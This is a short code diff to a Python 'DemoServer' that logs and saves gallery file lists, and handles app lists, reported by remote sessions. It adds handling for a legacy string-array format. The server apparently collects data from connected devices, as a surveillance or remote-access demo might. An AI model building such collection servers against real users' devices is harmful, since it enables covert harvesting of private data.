@@ -606,7 +606,10 @@ class DemoServer:
             files = message.get("files", [])
             self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} items):")
             for f in files[:20]:
-                self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
+                if isinstance(f, dict):
+                    self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
+                else:
+                    self.log(f"    - {f}")
             if len(files) > 20:
                 self.log(f"    ... and {len(files) - 20} more")
             # Save gallery list to file
@@ -614,6 +617,16 @@ class DemoServer:
             with open(gallery_file, 'w') as f:
                 json.dump(files, f, indent=2)
             self.log(f"    [+] Saved to: {gallery_file}")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "file_list_legacy":
+            # Legacy format: simple string array
+            files = message.get("files", [])
+            self.log(f"[i] Gallery file list (legacy) from session {session.session_id} ({len(files)} files):")
+            for f in files[:20]:
+                self.log(f"    - {f}")
+            if len(files) > 20:
+                self.log(f"    ... and {len(files) - 20} more")
             self.log_to_file(message, session.address)
 
         elif msg_type == "app_list":
